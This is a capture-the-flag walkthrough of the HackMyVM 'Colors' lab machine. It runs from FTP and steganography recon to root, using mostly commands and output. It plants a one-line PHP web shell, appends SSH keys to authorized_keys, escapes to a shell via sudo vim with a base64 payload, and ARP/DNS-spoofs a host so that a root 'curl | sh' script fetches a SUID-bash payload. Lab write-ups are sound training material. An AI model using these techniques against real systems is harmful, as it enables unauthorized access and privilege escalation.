# Colors

## Note

Hey hacker, I've heard a lot about you and I've been told you're good. 

The FBI has hacked into my apache server and shut down my website. I need you to sneak in and retrieve the "root.txt" file. I left my credentials somewhere but I can't remember where.

I will pay you well if you succeed, good luck hacker.

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.183:21
Open 10.0.2.183:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.183
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1127     1127            0 Jan 27  2023 first
| -rw-r--r--    1 1039     1039            0 Jan 27  2023 second
| -rw-r--r--    1 0        0          290187 Feb 11  2023 secret.jpg
|_-rw-r--r--    1 1081     1081            0 Jan 27  2023 third
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.149
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-title: Document
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Unix
```
:::

## FTP

Dump FTP
```bash
└─$ wget -m ftp://anonymous:@10.0.2.183
```

```bash
└─$ stegseek secret.jpg $rockyou
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Nevermind"
[i] Original filename: "more_secret.txt".
[i] Extracting to "secret.jpg.out".

└─$ cat secret.jpg.out
<-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
```

- [https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier)
- [https://www.dcode.fr/ascii-85-encoding](https://www.dcode.fr/ascii-85-encoding)

![writeup.png](/assets/pentest/hackmyvm/colors/writeup.png)

> Creds: `pink:Pink4sPig$$`

Dump again
```bash
└─$ wget -m 'ftp://pink:Pink4sPig$$@10.0.2.183'
```

```bash
└─$ find 10.0.2.183 -type f -ls
  4495491      4 -rw-rw-r--   1 woyag    woyag         220 Jan 27  2023 10.0.2.183/pink/.bash_logout
  4495497      4 -rw-rw-r--   1 woyag    woyag         119 Jan  8 11:10 10.0.2.183/pink/.ssh/.listing
  4495492      4 -rw-rw-r--   1 woyag    woyag        3526 Jan 27  2023 10.0.2.183/pink/.bashrc
  4495493      4 -rw-rw-r--   1 woyag    woyag         807 Jan 27  2023 10.0.2.183/pink/.profile
  4495495      4 -rw-rw-r--   1 woyag    woyag          23 Feb 11  2023 10.0.2.183/pink/note.txt
  4495494      4 -rw-rw-r--   1 woyag    woyag        3705 Feb 11  2023 10.0.2.183/pink/.viminfo
  4495490      4 -rw-rw-r--   1 woyag    woyag         598 Jan  8 11:10 10.0.2.183/pink/.listing
  4495488      4 -rw-rw-r--   1 woyag    woyag         369 Jan  8 11:10 10.0.2.183/.listing

└─$ cat .listing
drwxr-xr-x    6 0        0            4096 Jan 27  2023 .
drwxr-xr-x    6 0        0            4096 Jan 27  2023 ..
drwx------    2 1127     1127         4096 Feb 11  2023 green
drwx------    3 1000     1000         4096 Feb 11  2023 pink
drwx------    2 1081     1081         4096 Feb 20  2023 purple
drwx------    2 1039     1039         4096 Feb 11  2023 red
```

FTP seems to be serving `/home/` directory, let's upgrade to SSH

Never mind, forgot it's not open.
```bash
└─$ nc -zv 10.0.2.183 22
(UNKNOWN) [10.0.2.183] 22 (ssh) : Connection refused
```

```bash
┌──(woyag㉿kraken)-[~/…/Rooms/Colors/10.0.2.183/pink]
└─$ cat .viminfo
...
# File marks:
'0  1  28  /var/www/html/sh.php
'1  1  28  /var/www/html/a.php
'2  1  0  /var/www/html/a.php
'3  123  0  /etc/vsftpd.conf
'4  1  0  /etc/ftpusers
...
```

## HTTP

```html
└─$ curl http://10.0.2.183/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <img src="./seized.png" alt="">
</body>
</html>

└─$ curl http://10.0.2.183/a.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at 10.0.2.183 Port 80</address>
</body></html>

└─$ curl http://10.0.2.183/sh.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at 10.0.2.183 Port 80</address>
</body></html>
```

## SSH (IPv6)

FTP has no usable files. We can upload to home directory, but nothing. Nothing on HTTP.

Common technique to bypass firewall is IPv6, worth a try
```bash
└─$ ping6 -I eth0 -c 2 ff02::1
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::39e1:4802:7d90:fa6c%eth0: icmp_seq=1 ttl=64 time=0.086 ms
64 bytes from fe80::a00:27ff:fe94:20c8%eth0: icmp_seq=1 ttl=64 time=0.900 ms
64 bytes from fe80::39e1:4802:7d90:fa6c%eth0: icmp_seq=2 ttl=64 time=0.097 ms
...
└─$ ip -6 neigh show
fe80::a00:27ff:fe94:20c8 dev eth0 lladdr 08:00:27:94:20:c8 REACHABLE #<--
fe80::1c32:4358:76a1:a4a0 dev eth1 lladdr 0a:00:27:00:00:05 STALE
```

Success
```bash
└─$ ncat -zv6 fe80::a00:27ff:fe94:20c8%eth0 22
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Connected to [fe80::a00:27ff:fe94:20c8]:22.
Ncat: 0 bytes sent, 0 bytes received in 0.16 seconds.
```

```bash
└─$ gen_ssh_deploy id_rsa pink
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/pink/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOSgYHtvGlMAmFFBHhyXvh2T1bv4Y26yXn/4fF+hjP+L woyag@kraken' >> /home/pink/.ssh/authorized_keys; chmod 700 /home/pink/.ssh; chmod 600 /home/pink/.ssh/authorized_keys
```

Upload SSH key
```bash
└─$ curl --user 'pink:Pink4sPig$$' -T id_rsa.pub ftp://10.0.2.183/pink/.ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa pink@fe80::a00:27ff:fe94:20c8%eth0
pink@color:~$ id
uid=1000(pink) gid=1000(pink) groups=1000(pink),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
```

## Privilege Escalation (www-data)

We can write to webserver, take over `www-data`
```bash
pink@color:/var/www/html$ ls
index.html  index.html.bak  seized.png
pink@color:/var/www/html$ echo x > y
pink@color:/var/www/html$ rm y
```

```bash
pink@color:/var/www/html$ cat /etc/php/7.4/apache2/php.ini  | grep disable_functions
disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
```

```bash
pink@color:/var/www/html$ echo '<?=`$_REQUEST[0]`?>' > t.php
---
└─$ curl http://10.0.2.183/t.php --data-urlencode '0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation (green)

```bash
└─$ curl http://10.0.2.183/t.php --data-urlencode '0=sudo -l'
Matching Defaults entries for www-data on color:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on color:
    (green) NOPASSWD: /usr/bin/vim
```

- [https://gtfobins.github.io/gtfobins/vim/#sudo](https://gtfobins.github.io/gtfobins/vim/#sudo)

```bash
└─$ gen_ssh_deploy id_rsa green
[+] Remote command to run:
mkdir -p /home/green/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOSgYHtvGlMAmFFBHhyXvh2T1bv4Y26yXn/4fF+hjP+L woyag@kraken' >> /home/green/.ssh/authorized_keys; chmod 700 /home/green/.ssh; chmod 600 /home/green/.ssh/authorized_keys

└─$ gen_ssh_deploy id_rsa green | tail -1 | base64 -w0
bWtkaXIgLXAgL2hvbWUvZ3JlZW4vLnNzaDsgZWNobyAnc3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSU9TZ1lIdHZHbE1BbUZGQkhoeVh2aDJUMWJ2NFkyNnlYbi80ZkYraGpQK0wgd295YWdAa3Jha2VuJyA+PiAvaG9tZS9ncmVlbi8uc3NoL2F1dGhvcml6ZWRfa2V5czsgY2htb2QgNzAwIC9ob21lL2dyZWVuLy5zc2g7IGNobW9kIDYwMCAvaG9tZS9ncmVlbi8uc3NoL2F1dGhvcml6ZWRfa2V5cwo= 

└─$ curl http://10.0.2.183/t.php --data-urlencode $'0=sudo -u green vim -c ":!/bin/sh -c \'echo bWtkaXIgLXAgL2hvbWUvZ3JlZW4vLnNzaDsgZWNobyAnc3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSU9TZ1lIdHZHbE1BbUZGQkhoeVh2aDJUMWJ2NFkyNnlYbi80ZkYraGpQK0wgd295YWdAa3Jha2VuJyA+PiAvaG9tZS9ncmVlbi8uc3NoL2F1dGhvcml6ZWRfa2V5czsgY2htb2QgNzAwIC9ob21lL2dyZWVuLy5zc2g7IGNobW9kIDYwMCAvaG9tZS9ncmVlbi8uc3NoL2F1dGhvcml6ZWRfa2V5cwo= | base64 -d | /bin/sh\'"'
```

```bash
└─$ ssh -i id_rsa green@fe80::a00:27ff:fe94:20c8%eth0
green@color:~$ id
uid=1127(green) gid=1127(green) groups=1127(green)
```

## Privilege Escalation (purple)

```bash
green@color:~$ cat note.txt
You've been working very well lately Green, so I'm going to give you one last test. If you pass it I'll give you the password for purple.

-root
```

It's ELF binary
```bash
green@color:~$ file test_4_green
test_4_green: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9496189c225509b7a26fbf1a874b3edeb9be0859, for GNU/Linux 3.2.0, not stripped
```

Download
```bash
└─$ scp -i id_rsa 'green'@[fe80::a00:27ff:fe94:20c8%eth0]:test_4_green .
```

- [https://dogbolt.org/?id=9d45f9a1-dd58-4bd3-8a3d-0e525a80106e#angr=151&Hex-Rays=198](https://dogbolt.org/?id=9d45f9a1-dd58-4bd3-8a3d-0e525a80106e#angr=151&Hex-Rays=198)

Recover code
```bash
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

long long lucas(int n) {
    if (n == 0) return 2;
    if (n == 1) return 1;
    return lucas(n - 1) + lucas(n - 2);
}

int main() {
    int guess;
    int secret;
    char data[] = "FuprpRblcTzeg5JDNNasqeWKpFHvms4rMgrpAFYj5Zngqgvl7jK0iPpViDReY6nognFSGKtS4zTEiVPgzDXnPj06WsScYlt0EFryMGvP8SjVsg9YjmxTeHkXUdzliZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqaCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKhaAWAR7kxJC8METsFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23haAWAR7kxJC8METFFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23";

    srand(time(NULL));
    secret = rand() % 1000000 + 1;

    printf("Guess the number im thinking: ");
    if (scanf("%d", &guess) != 1) return 1;

    if (guess == secret) {
        puts("Correct!! Here is the pass:");
        for (int i = 0; i <= 12; ++i) {
            putchar(data[lucas(i)]);
        }
        putchar('\n');
    } else {
        puts("Nope, sorry");
    }

    return 0;
}
```

After executing the C code: `purpleaslilas`

> Creds: `purple:purpleaslilas`

```bash
green@color:~$ su - purple
Password:
purple@color:~$ id
uid=1081(purple) gid=1081(purple) groups=1081(purple)
purple@color:~$ mkdir -p /home/purple/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOSgYHtvGlMAmFFBHhyXvh2T1bv4Y26yXn/4fF+hjP+L woyag@kraken' >> /home/purple/.ssh/authorized_keys; chmod 700 /home/purple/.ssh; chmod 600 /home/purple/.ssh/authorized_keys
```

### User.txt

```bash
purple@color:~$ cat user.txt
(:Ez_Colors:)
```

## Privilege Escalation (root)

```bash
purple@color:~$ cat for_purple_only.txt
As the highest level user I allow you to use the supreme ddos attack script.

purple@color:~$ sudo -l
Matching Defaults entries for purple on color:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User purple may run the following commands on color:
    (root) NOPASSWD: /attack_dir/ddos.sh

purple@color:~$ ls -l /attack_dir/ddos.sh
-rwxr--r-- 1 root root 75 Feb 11  2023 /attack_dir/ddos.sh
```

```bash
purple@color:~$ cat /attack_dir/ddos.sh
#!/bin/bash
/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p
```

Create malicious script
```bash
└─$ echo 'install -m4777 /bin/bash /tmp/rootbash' > attack.sh
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Spoof DNS
```bash
└─$ sudo bettercap -iface eth0 -eval "set dns.spoof.domains masterddos.hmv; set dns.spoof.address 10.0.2.149; set arp.spoof.targets 10.0.2.183; dns.spoof on; arp.spoof on"
```

Exploit
```bash
purple@color:~$ sudo /attack_dir/ddos.sh
purple@color:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1081(purple) gid=1081(purple) euid=0(root) groups=1081(purple)
```

### Root.txt

```
rootbash-5.1# cat /root/root.txt
(:go_play_some_minecraft:)
```
